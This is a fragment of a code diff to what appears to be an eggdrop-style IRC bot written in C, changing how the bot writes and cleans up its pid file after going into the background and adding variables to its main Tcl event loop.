-	  /* Let the bot live since this doesn't appear to be a botchk */
-	  printf(EGG_NOWRITE, pid_file);
-	  unlink(pid_file);
-	  fclose(f);
-        } else {
-          fclose(f);
-        }
-      } else
-        printf(EGG_NOWRITE, pid_file);
+    /* Write pid to file */
+    unlink(conf.bot->pid_file);
+    if ((f = fopen(conf.bot->pid_file, "w")) != NULL) {
+      fprintf(f, "%u\n", xx);
+      if (fflush(f)) {
+      /* Let the bot live since this doesn't appear to be a botchk */
+        printf(EGG_NOWRITE, conf.bot->pid_file);
+        unlink(conf.bot->pid_file);
+        fclose(f);
+      } else {
+        fclose(f);
+      }
+    } else
+      printf(EGG_NOWRITE, conf.bot->pid_file);
 #ifdef CYGWIN_HACKS
       printf(STR("Launched into the background  (pid: %d)\n\n"), xx);
 #endif /* CYGWIN_HACKS */
-    }
   }
 
   use_stderr = 0;		/* Stop writing to stderr now */
@@ -1262,7 +790,8 @@ int main(int argc, char **argv)
 
   debug0(STR("main: entering loop"));
   while (1) {
-    int socket_cleanup = 0;
+    int socket_cleanup = 0, i, xx;
+    char buf[SGRAB + 9] = "";
 
     /* Process a single tcl event */
     Tcl_DoOneEvent(TCL_ALL_EVENTS | TCL_DONT_WAIT);
